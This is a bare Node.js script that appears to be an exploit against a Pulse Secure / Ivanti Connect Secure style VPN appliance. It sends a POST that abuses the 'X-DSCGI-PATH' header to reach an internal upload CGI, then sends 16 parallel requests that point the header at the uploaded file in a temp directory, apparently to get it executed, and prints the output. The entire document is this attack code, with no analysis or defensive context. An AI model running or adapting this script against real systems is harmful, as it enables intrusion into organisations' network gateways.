const endpoint = process.argv[2] + '/dana-na/auth/url_default/welcome.cgi';
const uploadedNameDigest = process.argv[3];
async function route() {
  await fetch(endpoint, { method: 'POST', headers: {
    'X-DSCGI-PATH': '/home/webserver/htdocs/dana/fb/smb/wu.cgi'
  }, body: process.argv[4] });
  const responses = await Promise.all(Array.from({length: 16}, () =>
    fetch(endpoint, { headers: {
      'x-dscgi-path': '/home/runtime/tmp/' + uploadedNameDigest
    } })
  ));
  for (const response of responses) console.log(await response.text());
}
route();
